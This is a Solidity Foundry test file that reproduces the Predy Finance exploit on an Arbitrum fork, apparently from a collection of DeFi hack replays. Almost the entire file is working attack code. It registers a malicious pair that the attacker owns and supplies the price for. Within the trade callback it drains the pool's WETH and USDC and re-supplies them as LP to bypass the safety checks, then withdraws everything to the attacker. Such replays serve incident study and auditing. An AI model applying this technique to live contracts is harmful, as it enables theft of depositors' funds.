// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : $464K
// Attacker : https://arbiscan.io/address/0x76b02ab483482740248e2ab38b5a879a31c6d008
// Attack Contract : https://arbiscan.io/address/0xb79714634895f52a4f6a75eceb58c96246370149
// Vulnerable Contract : https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c
// Attack Tx : https://arbiscan.io/tx/0xbe163f651d23f0c9e4d4a443c0cc163134a31a1c2761b60188adcfd33178f50f

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x7b8b944ab2f24c829504a7a6d70fce5298f2147c#code

// @Analysis
// Post-mortem :
// Twitter Guy :
// Hacking God :
pragma solidity ^0.8.0;

contract PredyFinance is BaseTestWithBalanceLog {
    uint256 blocknumToForkFrom = 211_107_441;
    IERC20 USDC = IERC20(0xaf88d065e77c8cC2239327C5EDb3A432268e5831);
    IERC20 WETH = IERC20(0x82aF49447D8a07e3bd95BD0d56f35241523fBab1);
    IPredyPool predyPool = IPredyPool(0x9215748657319B17fecb2b5D086A3147BFBC8613);

    function setUp() public {
        vm.createSelectFork("arbitrum", blocknumToForkFrom);
        //Change this to the target token to get token balance of,Keep it address 0 if its ETH that is gotten at the end of the exploit
        fundingToken = address(USDC);
        vm.label(address(WETH), "WETH");
        vm.label(address(USDC), "USDC");
        vm.label(address(predyPool), "PredyPool");
    }

    function testExploit() public balanceLog {
        USDC.approve(address(predyPool), type(uint256).max);
        WETH.approve(address(predyPool), type(uint256).max);

        //implement exploit code here
        AddPairLogic.AddPairParams memory addPairParam = AddPairLogic.AddPairParams({
            marginId: address(WETH),
            poolOwner: address(this),
            uniswapPool: address(0xC6962004f452bE9203591991D15f6b388e09E8D0),
            priceFeed: address(this),
            whitelistEnabled: false,
            fee: 0,
            assetRiskParams: Perp.AssetRiskParams({
                riskRatio: 100_000_001,
                debtRiskRatio: 0,
                rangeSize: 1000,
                rebalanceThreshold: 500,
                minSlippage: 1_005_000,
                maxSlippage: 1_050_000
            }),
            quoteIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            }),
            baseIrmParams: InterestRateModel.IRMParams({
                baseRate: 10_000_000_000_000_000,
                kinkRate: 900_000_000_000_000_000,
                slope1: 500_000_000_000_000_000,
                slope2: 1_000_000_000_000_000_000
            })
        });
        uint256 pairId = predyPool.registerPair(addPairParam); // register pair, the owner of the pair is attack contract

        IPredyPool.TradeParams memory tradeParams =
            IPredyPool.TradeParams({pairId: pairId, vaultId: 0, tradeAmount: 0, tradeAmountSqrt: 0, extraData: ""});
        predyPool.trade(tradeParams, ""); // set the attack contract as the locker

        predyPool.withdraw(pairId, true, WETH.balanceOf(address(predyPool))); // withdraw the LP to the attacker
        predyPool.withdraw(pairId, false, USDC.balanceOf(address(predyPool))); // withdraw the LP to the attacker
    }

    function predyTradeAfterCallback(
        IPredyPool.TradeParams memory tradeParams,
        IPredyPool.TradeResult memory tradeResult
    ) external {
        predyPool.take(true, address(this), WETH.balanceOf(address(predyPool))); // take the asset to the attacker
        predyPool.supply(tradeParams.pairId, true, WETH.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function PositionCalculator.checkSafe()

        predyPool.take(false, address(this), USDC.balanceOf(address(predyPool))); // take the asset to the attacker
        predyPool.supply(tradeParams.pairId, false, USDC.balanceOf(address(this))); // supply the asset as LP and bypass the check in the function finalizeLock()
    }

    function getSqrtPrice() external view returns (uint256) {
        return 40_000_000_000;
    }
}

library AddPairLogic {
    struct AddPairParams {
        address marginId;
        address poolOwner;
        address uniswapPool;
        address priceFeed;
        bool whitelistEnabled;
        uint8 fee;
        Perp.AssetRiskParams assetRiskParams;
        InterestRateModel.IRMParams quoteIrmParams;
        InterestRateModel.IRMParams baseIrmParams;
    }
}

library Perp {
    struct AssetRiskParams {
        uint128 riskRatio;
        uint128 debtRiskRatio;
        int24 rangeSize;
        int24 rebalanceThreshold;
        uint64 minSlippage;
        uint64 maxSlippage;
    }
}

library InterestRateModel {
    struct IRMParams {
        uint256 baseRate;
        uint256 kinkRate;
        uint256 slope1;
        uint256 slope2;
    }
}

interface IPredyPool {
    struct TradeParams {
        uint256 pairId;
        uint256 vaultId;
        int256 tradeAmount;
        int256 tradeAmountSqrt;
        bytes extraData;
    }

    struct TradeResult {
        Payoff payoff;
        uint256 vaultId;
        int256 fee;
        int256 minMargin;
        int256 averagePrice;
        uint256 sqrtTwap;
        uint256 sqrtPrice;
    }

    struct Payoff {
        int256 perpEntryUpdate;
        int256 sqrtEntryUpdate;
        int256 sqrtRebalanceEntryUpdateUnderlying;
        int256 sqrtRebalanceEntryUpdateStable;
        int256 perpPayoff;
        int256 sqrtPayoff;
    }

    function registerPair(AddPairLogic.AddPairParams memory addPairParam) external returns (uint256);

    function trade(
        TradeParams memory tradeParams,
        bytes memory settlementData
    ) external returns (TradeResult memory tradeResult);

    function take(bool isQuoteAsset, address to, uint256 amount) external;

    function supply(
        uint256 pairId,
        bool isQuoteAsset,
        uint256 supplyAmount
    ) external returns (uint256 finalSuppliedAmount);

    function withdraw(
        uint256 pairId,
        bool isQuoteAsset,
        uint256 withdrawAmount
    ) external returns (uint256 finalBurnAmount, uint256 finalWithdrawAmount);
}
